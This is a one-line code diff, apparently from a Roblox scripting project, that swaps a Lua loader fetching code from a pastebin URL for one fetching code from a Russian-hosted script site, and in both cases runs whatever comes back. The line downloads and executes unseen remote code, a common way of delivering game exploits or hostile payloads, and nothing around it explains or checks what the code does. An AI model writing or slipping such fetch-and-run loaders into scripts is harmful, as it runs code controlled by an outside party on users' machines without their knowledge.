@@ -1,1 +1,1 @@
- loadstring(game:HttpGet'https://pastebin.com/raw/TFfWqiXK')()
+loadstring(game:HttpGet("https://reativ.ru/Scripts/Free/NT.lua", true))() 
